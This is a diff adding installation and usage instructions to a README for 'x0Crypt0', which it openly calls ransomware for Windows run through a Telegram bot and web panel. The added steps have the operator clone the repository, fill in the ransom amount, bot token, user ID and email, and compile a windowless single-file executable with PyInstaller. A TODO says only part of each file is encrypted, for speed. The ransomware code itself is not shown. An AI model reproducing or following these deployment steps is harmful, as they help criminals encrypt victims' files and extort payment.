@@ -1,6 +1,29 @@
 # x0Crypt0
 
+This is a ransomware written for Windows 10, 7 , 8   in Telegram bot and web panel
 
+
+# How to install
+
+1. Install `python3.8`, `pip3` in your system.
+2. Clone the project `https://github.com/Mr-Hax0r/ransomware_x0Crypt0`.
+
+  ```bash
+  cd ransomware_x0Crypt0
+  pip3 install -r requirements.txt
+  ```
+
+
+
+# How To Use
+
+In file x0Crypt0.py, complete the amount, token, user ID and email and ...
+
+```bash
+  pip3 install pyinstaller #only for Windows
+  python pyinstaller.py --noconsole --onefile x0Crypt0.py
+
+```
 
 ## TODO
 - [x] Encrypt a few KB (MB) of file for the speed 
